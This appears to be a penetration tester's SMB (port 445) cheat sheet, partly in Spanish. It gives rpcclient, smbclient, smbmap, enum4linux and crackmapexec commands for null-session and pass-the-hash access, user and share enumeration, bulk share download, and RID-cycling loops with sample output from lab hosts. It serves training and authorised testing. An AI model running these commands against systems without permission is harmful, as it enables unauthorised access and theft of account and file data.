# Port 445 - SMB



## Test connection

```bash
rpcclient -U "" -N <IP> #No creds
rpcclient -U "username%passwd" <IP> #With creds

smbclient --no-pass -L //<IP> # Null user
```



## Enumeration

### Basic Info

```bash
enum4linux -a <TARGET-IP> [-u "" -p ""]

smbclient --no-pass //<TARGET-IP>/<Folder> # Null session

##### RPCCLIENT #####
# Test Connection
rpcclient -U "" -N <TARGET-IP> # Null session
rpcclient //machine.htb -U domain.local/<USER>%<HASH> --pw-nt-hash
rpcclient -U "<USER>%<PASS>" <TARGET-IP> #With creds

# Domain Info
querydomuinfo         # Description of the domain
enumdomains           # List domains in the network
getdompwinfo          # Password policy info

# Enum users
enumdomuser           # List all users
querydispinfo         # Description of users
queryuser <RID>       # Description of an user by his rid
queryuser <name>      # Description of an user by his name
lsaenumsid            # Enum sid's of users
lookupnames <Name>    # Enum sid's for an user
getusrdompwinfo <RID> # Password policy of an user

# Enum groups
enumdomgroups         # List of groups
querygroup <RID>      # Description of the group

querygroupmem <RID>   # List rid's of the users in this group
```

### Shared Folders

```bash
smbmap -H <TARGET-IP> -u 'asdasd' # Null session
smbmap [-u "username" -p "password"] -R [Folder] -H <TARGET-IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <TARGET-IP> [-P <PORT>] # Non-Recursive list

crackmapexec smb 10.10.10.192 -u 'asdasd' -p '' --shares # Null session
## RPCCLIENT
netshareenum
netshareenumall
netsharegetinfo <SHARE-NAME>

## Download Shared Folders
smbmap smbmap -H <TARGET-IP> -u 'username' -p 'password' --download '<Path>' # one file

smbclient //<target-ip>/<shared-foldaer> -U "<username>%password>"
smb: \> prompt off         
smb: \> recurse on         
smb: \> mget * 
```

## Explotación

### Rid Cycling

Este ataque consta de enumerar usuarios con sus RID's y SID's a través de una null session con rpcclient..

```bash
rpcclient -U "" -N 10.10.10.129 -c "lsaenumsid" # sin creds
found 6 SIDs

S-1-5-32-550
S-1-5-32-548
S-1-5-32-551
S-1-5-32-549
S-1-5-32-544

for i in $(seq 500 600); do rpcclient -U "" -N 10.10.10.129 -c "lookupsids S-1-5-32-$i" 2>/dev/null; done | grep -viE "unknown"
S-1-5-32-544 BUILTIN\Administrators (4)
S-1-5-32-545 BUILTIN\Users (4)
S-1-5-32-546 BUILTIN\Guests (4)
S-1-5-32-547 BUILTIN\Power Users (4)
...


# A nivel de sistema siempre existe el usuario root por lo que 
# podremos listar su sid, y este nos dará otro grupo de sids
# para seguir enumerando usuarios

rpcclient -U "" -N 10.10.10.129 -c "lookupnames root"                                              
root S-1-22-1-0 (User: 1)

for i in $(seq 0 600); do rpcclient -U "" -N 10.10.10.129 -c "lookupsids S-1-22-1-$i" 2>/dev/null; done | grep -viE "unknown" 
S-1-22-1-0 Unix User\root (1)
S-1-22-1-1 Unix User\daemon (1)
S-1-22-1-2 Unix User\bin (1)
S-1-22-1-3 Unix User\sys (1)
S-1-22-1-4 Unix User\sync (1)
S-1-22-1-5 Unix User\games (1)
```
